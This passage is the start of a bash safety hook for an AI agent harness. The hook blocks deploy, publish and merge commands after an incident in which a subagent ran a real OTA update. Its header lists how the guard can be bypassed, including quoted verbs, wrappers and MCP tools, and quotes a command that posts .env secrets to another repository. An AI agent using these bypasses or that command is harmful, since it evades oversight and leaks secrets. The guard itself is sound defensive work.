#!/usr/bin/env bash
# PreToolUse(Bash) — structural deny for outward-facing CLI mutations: eas
# update/publish/submit (incl. mutating update:*/channel:*/branch:* colon
# subcommands and `eas build --auto-submit`), mutating railway verbs (incl.
# `railway run` and variable/service/environment sub-subcommands), npm publish,
# this repo's OWN `npm run update:preview|update:production` OTA scripts, and
# mutating gh subcommands (incl. `gh api` with a mutating HTTP method, and any
# gh PR write retargeted at another repo via --repo/-R). Hardens the prose-only
# mitigation in
# docs/solutions/conventions/never-execute-an-outward-facing-cli-fragment-in-review-2026-08-16.md
# after the 2026-08-16 accidental-OTA incident (a subagent ran a real `eas
# update` fragment while probing a PATH-stub hypothesis during a code review).
#
# SCOPE — this hook only sees the Bash tool's `tool_input.command` string. It
# does NOT cover the equivalent MCP tools available in some environments
# (`mcp__github__merge_pull_request`, `mcp__claude_ai_Railway__redeploy`,
# `mcp__claude_ai_Railway__create-deployment`, `mcp__claude_ai_Railway__set-variables`,
# …) — those bypass this hook entirely. The prose rule (code-reviewer.md
# contract + the conventions doc above) remains the only control for those
# paths. This is a Bash-only structural backstop, not a full sandbox — never
# cite it as covering the MCP surface.
#
# COMMAND-POSITION ANCHORS ARE GUARD-LOCAL. This hook uses its OWN
# `_OUT_POS_PREFIX`/`_OUT_POS_SUFFIX`, deliberately WIDER than
# lib/cmd-detect.sh's `_CMD_POS_PREFIX`/`_CMD_POS_SUFFIX`:
#   * suffix also closes on `;`, `&`, `|` and a backtick — the lib's
#     `([[:space:]]|[)]|$)` never matched a verb that is the TERMINAL token of
#     its clause, so `npm publish;`, `eas update;`, `railway up&`,
#     `eas update|cat` and `gh pr merge;` were all ALLOWED (review round 3);
#   * prefix also opens after a backtick, a `{` group, and a `!` negation, and
#     skips the zero-arg shell KEYWORDS `then|do|else|elif|time` — so
#     `` `eas update` ``, `{ eas update; }`, `if true; then eas update; fi`,
#     `for b in preview; do eas update --branch $b; done`, `! eas update` and
#     `time eas update` are no longer ALLOWED.
# The widening lives HERE, not in lib/cmd-detect.sh, because that lib feeds
# seven hooks (git-safety.sh, core-bare-guard.sh, pr-preflight-guard.sh,
# commit-verify.sh, pr-verify.sh, drift-detect*.sh) whose gates are outside
# this hook's scope contract. Widening an anchor can only ever ADD matches, so
# for THIS deny-only hook it is a strict superset — but for a lib shared with
# gates that *permit* on a match it is not, hence the local copy.
#
# MATCHING IS CASE-INSENSITIVE for the command words (`-i` on every verb grep,
# and on the necessary-substring fast path via `nocasematch`). macOS APFS is
# case-insensitive, so `EAS update`, `GH pr merge 42` and `RAILWAY down` all
# resolve to the real binaries; case-sensitive matching ALLOWED every one of
# them (review round 3). FLAG detection (`--admin`, `--repo`/`-R`,
# `--auto-submit`) stays case-SENSITIVE: gh/eas flag parsing is case-sensitive,
# so `--ADMIN` is not a real flag, and a case-insensitive `-R` would false-match
# the `-r` inside `--remove-reviewer`.
#
# `gh pr merge` CARVE-OUT — bare/immediate `gh pr merge` DENIES, but
# `gh pr merge --auto ...` stays ALLOWED (unless `--admin` or `--repo`/`-R` is
# also present — see below): arming GitHub's native auto-merge does not merge
# until required checks pass, on a branch-protected target — it is NOT a
# "nothing happens synchronously" carve-out (on a PR whose required checks have
# already passed, GitHub merges within seconds), it is a "the same gate a human
# would wait for still applies" carve-out. This repo's own sanctioned /todo
# automerge mechanism (scripts/todo-automerge-guard.sh +
# .claude/agents/todo-executor.md Step 10) calls exactly
# `gh pr merge <n> --auto --squash --delete-branch` for guard-eligible PRs.
# Denying that by default would break the pipeline, and todo-executor.md is out
# of this hook's Scope Contract, so the carve-out is done here instead. More
# than one `gh pr merge` occurrence in the same command is ambiguous — DENY
# (the safe direction for a deny gate; mirrors cmd_gh_pr_ref's identical
# multi-occurrence refusal in lib/cmd-detect.sh).
# `--admin` ("use administrator privileges to merge a PR that does not meet
# requirements") contradicts the carve-out's own premise (that branch
# protection still gates the merge) — DENY regardless of --auto when present.
#
# `gh pr create`/`gh pr comment` are deliberately NOT denied — outward but
# routine (this repo's PR-creation and review-request flow uses them; see the
# todo's own Implementation Notes carve-out) — EXCEPT when `--repo`/`-R` is
# present. That flag retargets the write at an ARBITRARY GitHub repository with
# the user's PAT, which is unbounded egress, not routine workflow:
# `gh pr comment --repo other/org --body "$(cat .env)"` was ALLOWED (review
# round 3). lib/cmd-detect.sh:242 already treats `--repo`/`-R` in any spelling
# as disqualifying for the same reason; this follows that precedent. The
# routine flow never passes `--repo`, so the carve-out is unaffected. The same
# applies to `gh pr merge --repo other/org 42 --auto`, which arms auto-merge on
# someone else's PR.
#
# DOCUMENTED RESIDUALS (guardrail, not a sandbox — a determined bypass is
# always possible; ALLOW_OUTWARD_CLI=1 is the intentional escape hatch):
#   * A global flag before the verb (`npm --registry=x publish`, `eas
#     --non-interactive update`) defeats command-position anchoring — same
#     documented class as cmd-detect.sh's own arg-taking-wrapper residual.
#   * `npx eas update` / `npx gh pr merge` are not recognized: `npx` takes an
#     argument, so it is not a zero-arg runner word _OUT_POS_PREFIX skips (by
#     design — see lib/cmd-detect.sh's header). `bunx`/`bun run` likewise.
#   * `eas publish` does not exist in the installed eas-cli (20.1.0 at time of
#     writing) — the pattern is kept anyway per the acceptance criteria's
#     literal wording and to catch an older/different CLI version; a no-op
#     today, not a false sense of coverage.
#   * A verb split across a shell line-continuation (`eas \<newline>update`) IS
#     covered on all three paths as of review round 3 — cmd_bare collapses the
#     backslash+newline to spaces on the precise path, and
#     crude_smells_outward() now normalizes both a real 0x0A byte and the JSON
#     `\n` escape token to a space on the two degraded paths (previously the
#     escape's literal `n` broke the `[^a-zA-Z]+` separator class and grep's
#     line-orientation split the two tokens — both fallbacks ALLOWED every verb
#     family). What is still NOT recognized is a genuinely MULTI-LINE compound
#     (a real newline with no continuation backslash) on the PRECISE path,
#     where grep -E cannot span the newline: that fails toward DENY for
#     `gh pr merge` (the `--auto` carve-out cannot be seen on another line), the
#     safe direction.
#   * `bash -c "…"` / `sh -c '…'` / `eval "…"` / any interpreter `-c` wrapper
#     (also: `timeout 30 eas update`, `sudo railway up`) hides or shifts the
#     outward command out of command position — the wrapper-word case is the
#     same documented arg-taking-wrapper residual as above; the quoted-`-c`
#     case blanks via `cmd_bare` (the same primitive that stops `git commit
#     -m "mentions eas update"` from a false-positive deny) — same accepted
#     residual class as git-safety.sh's own sudo/env/command/xargs/subshell/
#     eval wrapper note.
#   * A command whose ENTIRE text is quoted (`'eas update'`) blanks to nothing
#     under cmd_bare, which the awk-broken detector below cannot distinguish
#     from "the blanking primitive failed" — it therefore routes to the crude
#     smell test and DENIES. Over-denial on a shape no real caller writes; the
#     safe direction.
#   * Absolute/relative-path invocation (`/usr/local/bin/eas update`,
#     `./node_modules/.bin/eas update`) does not match the literal
#     `eas`/`railway`/`npm`/`gh` command word.
#   * `gh workflow run`, `gh secret set`, `gh variable set` and other gh
#     namespaces beyond `pr`/`release`/`repo`/`api` are not covered — the
#     todo scoped this to "verb-scoped, not exhaustive"; `gh api` itself IS
#     covered (mutating -X/--method only) because it can reach the identical
#     `pr merge` action this hook already gates, via a different subcommand.
#   * The eas `update:*` colon namespace is PARTIALLY covered: the mutating
#     forms verified against `eas update --help` (eas-cli 20.1.0) —
#     update:delete, update:edit, update:republish,
#     update:revert-update-rollout, update:roll-back-to-embedded,
#     update:rollback — are denied explicitly below; `update:list`,
#     `update:view`, `update:insights` are the verified-read-only set that
#     stays allowed. An `eas` CLI version that adds a NEW mutating `update:*`
#     subcommand not in this list is not covered until this list is updated.
#     The `channel:`/`branch:` namespaces are covered for the mutating verbs
#     create|edit|delete|rename only (review round 3 found `eas channel:edit`
#     and `eas branch:delete` ALLOWED with effects identical to already-denied
#     commands); their read-only `:list`/`:view` forms stay allowed, and any
#     OTHER `eas` namespace (`eas device:*`, `eas credentials`, `eas env:*`,
#     `eas metadata:push`, …) is explicitly OUT OF SCOPE — not covered.
#   * `gh api -X "POST" ...` (a QUOTED HTTP method value) is not recognized:
#     the gh-api check runs on `$BARE`, and `cmd_bare` blanks quoted CONTENT
#     — the same primitive that stops a quoted MENTION elsewhere in this
#     hook from a false-positive deny also removes a genuinely quoted flag
#     value from view. The unquoted form (`-X POST`, the common real-world
#     spelling) is caught.
#   * `npm run update:preview|update:production` IS covered (see below), as are
#     the `yarn`/`pnpm` bare-script equivalents, and — since the _OUT_FLAG_RUN
#     fix — every FLAG spelling between the runner, `run`, and the script name
#     (`-s`, `--silent`, `--flag=value`, and `--flag value` with a
#     space-separated value). `bunx`/a shell alias/`corepack npm run …`/a direct
#     `sh -c "$(node -p 'require("./package.json").scripts["update:preview"]')"`
#     are not.
#   * *** QUOTED COMMAND WORDS DEFEAT EVERY CHECK IN THIS FILE. *** `cmd_bare`
#     BLANKS quoted spans so a mention (`git commit -m "add eas update guard"`)
#     does not false-positive — but the shell CONCATENATES `eas "update"` into
#     the argv `eas update`, byte-identical to a bare invocation. So the verb is
#     erased before any pattern below runs:
#         eas "update" --branch preview  ->  BARE = [eas          --branch preview]
#         npm run "update:preview"       ->  BARE = [npm run                      ]
#     ALLOWED today on all three paths, `main` included: `eas "update"`,
#     `eas up"date"`, `npm pub"lish"`, `gh pr "merge" 42`, `railway "up"`,
#     `npm run "update:preview"`. This is the SAME rule this file already states
#     correctly for `--admin` below ("quotes affect word-splitting, not what gh
#     actually receives") — applied to flag detection and never to command
#     words. It is NOT fixable by stripping quotes instead of blanking them:
#     `git commit -m "chore; eas update"` would then put the verb in genuine
#     command position and deny. Closing it needs a way to tell "a quoted span
#     inside another command's arguments" from "a quoted span among an outward
#     command's own words" — a design change, not a pattern tweak, and out of
#     this hook's current scope. Tracked; do not read the specificity of the
#     rest of this list as evidence this one is handled.
#   * SCOPE, stated so it is not inferred: `update:preview`/`update:production`
#     are the only package.json scripts covered. `migrate:images-r2` and
#     `backfill:recipe-images` also mutate production Cloudflare R2 in place
#     (CLAUDE.md notes a real backfill run needs a CDN purge afterwards) and are
#     deliberately NOT covered here.
#
# Escape: `ALLOW_OUTWARD_CLI=1 <command>` as an INLINE prefix on the one Bash
# command (recognized from the command string itself — see the case
# statement below the CMD extraction for why this differs from an exported
# env var), OR export `ALLOW_OUTWARD_CLI=1` ambiently for the rest of the
# session (broader-scoped; prefer the inline form).
# Tests: .claude/hooks/test-guard-outward-cli.sh
set -uo pipefail

[ -n "${ALLOW_OUTWARD_CLI:-}" ] && exit 0

# Command-position building blocks — GUARD-LOCAL widened copies of
# lib/cmd-detect.sh's `_CMD_POS_*`. See the header's "COMMAND-POSITION ANCHORS
# ARE GUARD-LOCAL" note for why these are not upstreamed. `!` is deliberately
# NOT first in the prefix bracket class (a leading `!`/`^` reads as negation to
# some bracket-expression implementations); a backtick inside a single-quoted
# shell string is literal, so no escaping is needed for either constant.
_OUT_POS_PREFIX='(^|[;&|(`{!])[[:space:]]*(([A-Za-z_][A-Za-z0-9_]*=[^[:space:]]*|env|command|builtin|exec|nohup|setsid|then|do|else|elif|time)[[:space:]]+)*'
_OUT_POS_SUFFIX='([[:space:]]|[);&|`]|$)'

# `--repo`/`-R` in any spelling gh's flag parser accepts (`--repo v`,
# `--repo=v`, `"--repo" v`, `-R v`, `-Rv`). Case-SENSITIVE on purpose — see
# the header. Boundary class is "not a word/dash character" rather than
# strictly whitespace, exactly like the `--admin` check below, so a QUOTED
# flag name is still seen; `--repo`'s trailing boundary keeps a hypothetical
# `--repository` from matching, while `-R` deliberately has none so the glued
# `-Rowner/repo` form is caught.
_OUT_REPO_FLAG_RE='(^|[^-A-Za-z0-9])(--repo([^-A-Za-z0-9]|$)|-R)'

# gh_pr_clause_has_repo <subcommand-alternation> → exit 0 if the FIRST
# `gh pr <sub>` clause in the RAW command carries --repo/-R.
#
# RAW $CMD, not $BARE: a quoted flag NAME is still a real argv token
# (`gh pr comment "--repo" other/org` behaves identically to the unquoted
# form), and cmd_bare would blank it out of view — the same reasoning the
# `--admin` check below documents.
# CLAUSE-SCOPED, unlike that --admin check: `--admin` survives a whole-command
# scan because it is a rare token, but `-R` is `cp -R`, `grep -R`, `ls -R`,
# `rsync -R`. A whole-$CMD scan denied `cp -R src dst && gh pr create --title
# x --body y` — i.e. this repo's own PR-creation pipeline (caught in review
# before it shipped). lib/cmd-detect.sh:242, the precedent this check follows,
# is likewise clause-scoped: it applies the identical regex to `$full_match`,
# never to the whole command.
# The caller has already established from $BARE that a COMMAND-POSITION
# `gh pr <sub>` exists, so this raw, unanchored extraction only decides WHICH
# text to search. `head -1` inherits the same first-occurrence residual as the
# other multi-occurrence sites here (a quoted MENTION preceding a real
# invocation is searched instead) — deny direction, and the ambiguous-multi
# case is already denied outright for `merge`.
gh_pr_clause_has_repo() {
  local clause
  clause=$(printf '%s' "$CMD" | grep -oiE "gh[[:space:]]+pr[[:space:]]+($1)[^;&|]*" | head -1)
  [ -n "$clause" ] && grep -Eq "$_OUT_REPO_FLAG_RE" <<< "$clause"
}

# Crude, non-quote-aware smell test shared by ALL THREE fail-closed fallback
# paths below (no-jq; jq-envelope-unparseable; jq-present-but-lib-unsourceable
# or cmd_bare-broken). Kept in sync with the precise per-predicate patterns
# further down MANUALLY — every verb added to one list must be added to the
# other, or the fallback path is weaker than the precise path. $1 is raw,
# unblanked text (either the whole JSON envelope or an already-extracted
# command string — both are fine, this only greps for substrings).
#
# NEWLINE NORMALIZATION (review round 3): a shell line-continuation split the
# verb from its subcommand and defeated BOTH degraded paths for EVERY verb
# family. Two distinct mechanisms: the no-jq path scans the RAW, still-encoded
# JSON where a newline is the two-character escape `\n` — the literal byte `n`
# is a letter, so it breaks the `[^a-zA-Z]+` separator class; the other paths
# scan a DECODED string containing a real 0x0A, and grep is line-oriented, so
# the two tokens never share a line. Normalize both representations to a space
# BEFORE matching. Pure parameter expansion, NOT `tr`/`sed`: the no-jq path
# runs in an environment where those may be absent (its own test fixture links
# only bash/cat/grep), and depending on a tool that can be missing is precisely
# the bug C4 below fixes. Order matters — `\\n` (the raw envelope's escaped
# backslash + escaped newline) has `\n` as its tail, so the single `\n`
# substitution handles both spellings.
crude_smells_outward() {
  local t=${1//$'\n'/ }
  t=${t//\\n/ }
  # Command-word patterns — case-INSENSITIVE (macOS APFS resolves `EAS`).
  grep -Eqi 'eas[^a-zA-Z]+(update|publish|submit)|eas[^a-zA-Z]+update:(delete|edit|republish|revert-update-rollout|roll-back-to-embedded|rollback)|eas[^a-zA-Z]+(channel|branch):(create|edit|delete|rename)|eas[^a-zA-Z]+build[^;&|]*--auto-submit|railway[^a-zA-Z]+(up|deploy|redeploy|restart|down|delete|remove|rm|run)|railway[^a-zA-Z]+(variable|variables|vars|var)[^a-zA-Z]+(set|delete)|railway[^a-zA-Z]+(service|environment)[^a-zA-Z]+delete|npm[^a-zA-Z]+publish|(npm|pnpm|yarn)([^a-zA-Z]+-{1,2}[^[:space:]]*)*[^a-zA-Z]+(run-script|run)([^a-zA-Z]+-{1,2}[^[:space:]]*)*[^a-zA-Z]+update:(preview|production)|(yarn|pnpm)([^a-zA-Z]+-{1,2}[^[:space:]]*)*[^a-zA-Z]+update:(preview|production)|gh[^a-zA-Z]+pr[^a-zA-Z]+(merge|close|edit|ready|reopen|review|lock|unlock|update-branch|revert)|gh[^a-zA-Z]+release[^a-zA-Z]+(create|delete|delete-asset|edit|upload)|gh[^a-zA-Z]+repo[^a-zA-Z]+(create|delete|archive|unarchive|edit|rename|sync|fork)|gh[^a-zA-Z]+api[^a-zA-Z]' <<< "$t" && return 0
  # Flag-correlated patterns — case-SENSITIVE (a case-insensitive `-R` would
  # false-match the `-r` inside `--remove-reviewer`).
  grep -Eq 'gh[^a-zA-Z]+pr[^a-zA-Z]+(create|comment)[^;&|]*(--repo|-R)' <<< "$t" && return 0
  return 1
}

# Raw-envelope form of the inline "ALLOW_OUTWARD_CLI=1 <command>" bypass, for
# the paths that never obtain a decoded $CMD (no-jq; jq-extraction failure).
raw_inline_bypass() {
  case "$1" in *'"command":"ALLOW_OUTWARD_CLI=1 '*) return 0 ;; esac
  return 1
}

# Without jq we cannot parse the envelope or run the precise matcher. Fail
# CLOSED only for a raw payload that plausibly names one of the outward verbs
# above (mirrors git-safety.sh's own no-jq fallback) — an unrelated Bash call
# with none of these substrings is unaffected.
if ! command -v jq >/dev/null 2>&1; then
  INPUT=$(cat)
  # Inline "ALLOW_OUTWARD_CLI=1 <command>" prefix — see the note below the
  # jq-available branch for why this is a SEPARATE check from the ambient
  # env-var one above.
  raw_inline_bypass "$INPUT" && exit 0
  if grep -Eq '"tool_name"[[:space:]]*:[[:space:]]*"Bash"' <<< "$INPUT" \
     && crude_smells_outward "$INPUT"; then
    printf '%s' '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"guard-outward-cli: jq unavailable - failing closed for a command that looks like an outward-facing CLI mutation. Bypass: ALLOW_OUTWARD_CLI=1."}}'
  fi
  exit 0
fi

# Defined BEFORE the envelope extraction below so the jq-failure fallbacks can
# use it. Safe: jq is confirmed present at this point (the no-jq branch above
# already returned), and this function is never reached from that branch.
deny() {
  jq -n --arg r "$1" \
    '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":$r}}'
  exit 0
}

INPUT=$(cat)
# A jq EXTRACTION failure is not the same as "no jq". The previous version
# spelled both as `|| exit 0` — so malformed JSON, an absent `tool_name`, or a
# renamed envelope field ALLOWED everything, while the no-jq path fails CLOSED
# on the identical input. Fall back to the same crude smell test instead.
if ! TOOL=$(printf '%s' "$INPUT" | jq -re '.tool_name' 2>/dev/null); then
  raw_inline_bypass "$INPUT" && exit 0
  if crude_smells_outward "$INPUT"; then
    deny "guard-outward-cli: the hook envelope's .tool_name could not be read (malformed JSON or a changed envelope shape) - failing closed via the crude smell test for a payload that looks like an outward-facing CLI mutation. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
  fi
  exit 0
fi
[ "$TOOL" = "Bash" ] || exit 0
if ! CMD=$(printf '%s' "$INPUT" | jq -re '.tool_input.command' 2>/dev/null); then
  raw_inline_bypass "$INPUT" && exit 0
  if crude_smells_outward "$INPUT"; then
    deny "guard-outward-cli: the hook envelope's .tool_input.command could not be read (malformed JSON or a changed envelope shape) - failing closed via the crude smell test for a payload that looks like an outward-facing CLI mutation. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
  fi
  exit 0
fi

# Inline "ALLOW_OUTWARD_CLI=1 <command>" prefix — the documented single-command
# escape hatch. This is a SEPARATE check from the ambient `[ -n "$ALLOW_OUTWARD_CLI" ]`
# ambient bypass above: a PreToolUse hook runs in its OWN process, spawned
# BEFORE the gated command's own shell ever executes — so a `VAR=val cmd`
# assignment typed as a prefix on the Bash tool_input.command string never
# reaches this hook's environment; it only takes effect once (if) the
# command itself runs, which is too late for a check that must run first.
# Recognizing the literal prefix in the command STRING is the only way to
# honor it as "one command" (mirrors git-safety.sh's INLINE_BYPASS pattern
# for SKIP_WORKTREE_CONTRACT=1).
case "$CMD" in "ALLOW_OUTWARD_CLI=1 "*) exit 0 ;; esac

# Necessary-substring fast path (project_per_bash_hook_overhead): a command
# without ANY of these literal substrings cannot match any predicate below —
# cmd_bare only BLANKS characters, never inserts/moves them, so this is a
# strict superset of the precise matcher, never a bypass. Matched under
# `nocasematch` because the predicates below are case-insensitive: a
# case-SENSITIVE fast path would exit 0 on `EAS update` before any of them ran.
# (`pnpm` needs no entry of its own — it contains `npm`.)
shopt -s nocasematch
_OUT_FASTPATH=0
case "$CMD" in *eas*|*railway*|*npm*|*yarn*|*gh*) _OUT_FASTPATH=1 ;; esac
shopt -u nocasematch
[ "$_OUT_FASTPATH" = 1 ] || exit 0

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# If the shared lib is unsourceable (broken install), jq IS available here
# (the no-jq branch above already returned) and deny() is already defined —
# fall back to the SAME crude smell test used by the no-jq path, applied to
# the already-extracted CMD, rather than silently allowing every command.
# (A previous version of this hook exited 0 here on the false premise that
# "the no-jq path already covers this" — jq-present + lib-missing is a
# DIFFERENT condition the no-jq branch never runs for, so nothing covered it.)
if ! . "$HERE/lib/cmd-detect.sh" 2>/dev/null || ! declare -F cmd_bare >/dev/null; then
  if crude_smells_outward "$CMD"; then
    deny "guard-outward-cli: lib/cmd-detect.sh is unsourceable (broken install) - failing closed via the crude smell test for a command that looks like an outward-facing CLI mutation. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
  fi
  exit 0
fi

BARE=$(printf '%s' "$CMD" | cmd_bare)

# `declare -F cmd_bare` above proves the function is DEFINED, not that it
# WORKS. cmd_bare is implemented in awk; with jq/grep/sed present but awk
# ABSENT from PATH the lib sources cleanly, `declare -F` succeeds, the
# lib-unsourceable branch above is skipped — and cmd_bare then emits NOTHING,
# so every `grep -Eq … <<< "$BARE"` below finds nothing and this hook falls
# through to `exit 0` with ZERO fallback protection. Reproduced in review round
# 3 with a plain, unsplit `eas update --branch preview --platform all`, plus
# `npm publish` and `gh pr merge 42` — all ALLOWED, no crafting needed. Treat
# an all-blank $BARE from a non-blank $CMD as "the blanking primitive failed"
# and degrade to the crude smell test, mirroring the two branches above.
if [[ ! "$BARE" =~ [^[:space:]] ]] && [[ "$CMD" =~ [^[:space:]] ]]; then
  if crude_smells_outward "$CMD"; then
    deny "guard-outward-cli: cmd_bare returned nothing for a non-empty command (its awk backend is missing or broken) - failing closed via the crude smell test for a command that looks like an outward-facing CLI mutation. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
  fi
  exit 0
fi

# --- eas -------------------------------------------------------------------
# eas update/publish/submit (space-separated subcommand).
if grep -Eqi "${_OUT_POS_PREFIX}eas[[:space:]]+(update|publish|submit)${_OUT_POS_SUFFIX}" <<< "$BARE"; then
  deny "guard-outward-cli: command-position 'eas update/publish/submit' publishes an OTA update or app-store submission — the exact class of the 2026-08-16 accidental-OTA incident. Read-only forms (eas update:list, eas update:view, eas whoami, ...) are unaffected. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
fi
# eas update:* MUTATING colon subcommands — verified against `eas update
# --help` (eas-cli 20.1.0); see the header's DOCUMENTED RESIDUALS entry for
# the verified-read-only counterpart (update:list/view/insights, unaffected
# by this pattern since the colon puts them outside this alternation).
if grep -Eqi "${_OUT_POS_PREFIX}eas[[:space:]]+update:(delete|edit|republish|revert-update-rollout|roll-back-to-embedded|rollback)${_OUT_POS_SUFFIX}" <<< "$BARE"; then
  deny "guard-outward-cli: command-position 'eas update:delete/edit/republish/revert-update-rollout/roll-back-to-embedded/rollback' mutates what OTA update end users receive — the same incident class as bare 'eas update'. Read-only colon forms (eas update:list, eas update:view, eas update:insights) are unaffected. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
fi
# eas channel:*/branch:* MUTATING colon subcommands — a channel repoint or a
# branch delete changes which update end users receive, an effect identical to
# the already-denied `eas update:*` forms (review round 3 found all of these
# ALLOWED). Read-only `:list`/`:view` forms stay allowed.
if grep -Eqi "${_OUT_POS_PREFIX}eas[[:space:]]+(channel|branch):(create|edit|delete|rename)${_OUT_POS_SUFFIX}" <<< "$BARE"; then
  deny "guard-outward-cli: command-position 'eas channel:/branch: create/edit/delete/rename' repoints or deletes the channel/branch that decides which OTA update end users receive — the same effect class as 'eas update'. Read-only forms (eas channel:list, eas branch:view, ...) are unaffected. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
fi
# `eas build --auto-submit` (and --auto-submit-with-profile) submits the
# resulting binary to the store as soon as the build finishes — a store
# mutation wearing a build command's name. Plain `eas build` stays allowed.
# The flag check DELIBERATELY scans raw $CMD, not $BARE: like `--admin` below,
# a quoted `"--auto-submit"` is still a real argv token, and this check can
# only ever ADD a deny. No trailing boundary, so `--auto-submit-with-profile`
# is caught by the same pattern.
if grep -Eqi "${_OUT_POS_PREFIX}eas[[:space:]]+build${_OUT_POS_SUFFIX}" <<< "$BARE" \
   && grep -Eq '(^|[^-A-Za-z0-9])--auto-submit' <<< "$CMD"; then
  deny "guard-outward-cli: command-position 'eas build --auto-submit' submits the finished binary to the app store — an outward mutation, not just a build. Plain 'eas build' is unaffected. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
fi

# --- railway -----------------------------------------------------------------
# `run` is included: `railway run <cmd>` executes an ARBITRARY command with the
# live service's env injected — including the production DATABASE_URL (this
# repo's own prod backfill/seed docs use exactly that shape), so it is at least
# as outward as `railway up`.
if grep -Eqi "${_OUT_POS_PREFIX}railway[[:space:]]+(up|deploy|redeploy|restart|down|delete|remove|rm|run)${_OUT_POS_SUFFIX}" <<< "$BARE"; then
  deny "guard-outward-cli: command-position 'railway up/deploy/redeploy/restart/down/delete/remove/rm/run' mutates a live Railway service ('railway run' executes an arbitrary command with the LIVE service env, incl. the production DATABASE_URL). Read-only forms (railway status, railway logs, railway whoami, ...) are unaffected. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
fi
# railway variable set/delete (production secrets/env vars) and
# service/environment delete — a level deeper than the top-level verbs
# above, and at least as dangerous (an overwritten secret or a deleted
# service/environment is not recoverable by a redeploy the way up/down are).
if grep -Eqi "${_OUT_POS_PREFIX}railway[[:space:]]+(variable|variables|vars|var)[[:space:]]+(set|delete)${_OUT_POS_SUFFIX}" <<< "$BARE"; then
  deny "guard-outward-cli: command-position 'railway variable/vars/var set/delete' mutates a live service's environment variables (may include production secrets). Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
fi
if grep -Eqi "${_OUT_POS_PREFIX}railway[[:space:]]+(service|environment)[[:space:]]+delete${_OUT_POS_SUFFIX}" <<< "$BARE"; then
  deny "guard-outward-cli: command-position 'railway service/environment delete' deletes a live Railway service or environment. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
fi

# --- npm publish -------------------------------------------------------------
if grep -Eqi "${_OUT_POS_PREFIX}npm[[:space:]]+publish${_OUT_POS_SUFFIX}" <<< "$BARE"; then
  deny "guard-outward-cli: command-position 'npm publish' pushes a package to the registry. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
fi

# --- this repo's OWN OTA publish scripts -------------------------------------
# `npm run update:preview` / `npm run update:production` exec
# `eas update --branch preview|production --platform all` against
# https://api.ocrecipes.com — a real OTA to real users, i.e. EXACTLY the
# incident class this hook exists for, reached through a command word the
# `npm publish` and `eas update` patterns above both miss. Review round 3
# found both ALLOWED, while this hook's own deny message and self-tests
# asserted they were safe. The sanctioned flow is now
# `ALLOW_OUTWARD_CLI=1 npm run update:preview -- --message "…"`.
# `run-script` is npm's alias for `run`; it is listed FIRST so leftmost-longest
# alternation cannot settle on the `run` prefix. `pnpm`/`yarn` are spelled out
# in the ANCHORED alternation — "pnpm contains npm" only helps the unanchored
# crude test; a command-position anchor sees the `p` before `npm` and misses it
# (caught by this file's own `pnpm run update:preview` case). The bare-script
# spelling that yarn/pnpm accept WITHOUT `run` gets its own pattern.
#
# FLAG RUNS: the first shape of this pattern required the script name to sit
# IMMEDIATELY after `run`, so any flag between them walked straight through —
# `npm run --silent update:preview`, `npm run -s update:preview`, and
# `npm --loglevel=error run update:preview` all ALLOWED, on the exact command
# class this block exists for. That is this repo's own
# `deny-gate-flag-presence-check-needs-raw-text-and-every-spelling` lesson
# recurring inside its own fix: matching the bare spelling of a command is not
# matching the command. `_OUT_FLAG_RUN` absorbs zero-or-more `-`/`--` flag words
# (with or without `=value`) in BOTH positions — before `run` (npm global flags)
# and after it (npm run flags). It deliberately does NOT absorb a non-flag word,
# so `npm run build update:preview` still does not match: only flags may
# intervene, never another script name.
# The optional trailing `([[:space:]]+[^-[:space:]][^[:space:]]*)?` absorbs a
# SPACE-SEPARATED flag value (`--loglevel error`, `-C /tmp`, `-w pkg`). Without
# it the run broke at the mandatory trailing space and `npm run --loglevel error
# update:preview`, `npm -C /tmp run update:preview` and `yarn --loglevel error
# update:preview` all ALLOWED — the first version of this fix closed only the
# single-token spellings (`-s`, `--silent`, `--flag=value`) while its own doc
# claimed "every spelling", which is the same overclaim one layer down.
# COST, accepted deliberately: the value-absorption is greedy-with-backtracking,
# so a command that runs a DIFFERENT script with a flag AND names update:preview
# as a later argument (`npm run --silent build update:preview`) now denies. That
# is fail-CLOSED on a command essentially nobody writes, and the plain
# no-flag form (`npm run build update:preview`) still ALLOWS — pinned both ways.
_OUT_FLAG_RUN='([[:space:]]+-{1,2}[^[:space:]]*([[:space:]]+[^-[:space:]][^[:space:]]*)?)*[[:space:]]+'
if grep -Eqi "${_OUT_POS_PREFIX}(npm|pnpm|yarn)${_OUT_FLAG_RUN}(run-script|run)${_OUT_FLAG_RUN}update:(preview|production)${_OUT_POS_SUFFIX}" <<< "$BARE" \
   || grep -Eqi "${_OUT_POS_PREFIX}(yarn|pnpm)${_OUT_FLAG_RUN}update:(preview|production)${_OUT_POS_SUFFIX}" <<< "$BARE"; then
  deny "guard-outward-cli: command-position 'npm run update:preview/update:production' (and the yarn/pnpm bare-script equivalents) execs 'eas update --branch preview|production --platform all' against the production domain — a real OTA to real users, the exact class of the 2026-08-16 incident. Every OTHER 'npm run <script>' is unaffected. Bypass: ALLOW_OUTWARD_CLI=1 npm run update:preview -- --message \"...\" (one command)."
fi

# --- gh: bare 'gh pr merge' (see the --auto/--admin carve-out in the header) -
GH_PR_MERGE_RE="${_OUT_POS_PREFIX}gh[[:space:]]+pr[[:space:]]+merge${_OUT_POS_SUFFIX}"
GH_PR_MERGE_OCCURRENCES=$(printf '%s' "$BARE" | grep -oiE "$GH_PR_MERGE_RE" | wc -l | tr -d '[:space:]')
if [ "${GH_PR_MERGE_OCCURRENCES:-0}" -gt 1 ]; then
